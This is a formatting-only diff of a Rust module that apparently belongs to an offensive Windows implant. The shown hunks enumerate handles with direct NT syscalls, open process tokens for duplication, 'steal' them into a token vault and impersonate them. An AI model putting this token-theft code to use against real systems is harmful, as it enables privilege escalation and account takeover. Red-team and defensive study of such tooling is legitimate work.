@@ -168,7 +168,10 @@ fn enum_pids() -> Vec<u32> {
             let mut buf = vec![0u8; size];
             let mut ret = 0u32;
             let s = libra_syscalls::nt_query_system_information(
-                SYSTEM_HANDLE_INFORMATION, buf.as_mut_ptr() as usize, size as u32, &mut ret,
+                SYSTEM_HANDLE_INFORMATION,
+                buf.as_mut_ptr() as usize,
+                size as u32,
+                &mut ret,
             );
             if s == 0 {
                 break buf;
@@ -206,16 +209,14 @@ unsafe fn open_process_token(pid: u32) -> Option<Handle> {
         PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE,
         &oa as *const ObjectAttributes as usize,
         &client as *const ClientId as usize,
-    ) != 0 {
+    ) != 0
+    {
         return None;
     }
 
     let mut token = 0usize;
-    let s = libra_syscalls::nt_open_process_token(
-        process,
-        TOKEN_QUERY | TOKEN_DUPLICATE,
-        &mut token,
-    );
+    let s =
+        libra_syscalls::nt_open_process_token(process, TOKEN_QUERY | TOKEN_DUPLICATE, &mut token);
     libra_syscalls::nt_close(process);
     if s != 0 {
         return None;
@@ -230,7 +231,11 @@ unsafe fn token_username(token: Handle) -> String {
     let mut buf = [0u8; 256];
     let mut ret = 0u32;
     let s = libra_syscalls::nt_query_information_token(
-        token, TOKEN_USER, buf.as_mut_ptr() as usize, buf.len() as u32, &mut ret,
+        token,
+        TOKEN_USER,
+        buf.as_mut_ptr() as usize,
+        buf.len() as u32,
+        &mut ret,
     );
     if s != 0 {
         return "(unknown)".to_string();
@@ -290,7 +295,12 @@ fn steal(pid: u32) -> String {
     let mut next = NEXT_ID.lock().unwrap();
     let id = *next;
     *next += 1;
-    vault.push(VaultToken { id, pid, username: username.clone(), handle: token });
+    vault.push(VaultToken {
+        id,
+        pid,
+        username: username.clone(),
+        handle: token,
+    });
 
     serde_json::json!({
         "success": true,
@@ -367,7 +377,11 @@ unsafe fn impersonate_token(token: Handle) -> bool {
     let mut ty = 0u32;
     let mut ret = 0u32;
     let s = libra_syscalls::nt_query_information_token(
-        token, TOKEN_TYPE, &mut ty as *mut u32 as usize, 4, &mut ret,
+        token,
+        TOKEN_TYPE,
+        &mut ty as *mut u32 as usize,
+        4,
+        &mut ret,
     );
     if s != 0 {
         return false;
@@ -438,7 +452,10 @@ mod tests {
         let result = list();
         let v: Value = serde_json::from_str(&result).unwrap();
         assert_eq!(v["success"], true);
-        assert!(v["tokens"].as_array().map(|a| !a.is_empty()).unwrap_or(false));
+        assert!(v["tokens"]
+            .as_array()
+            .map(|a| !a.is_empty())
+            .unwrap_or(false));
     }
 
     #[test]
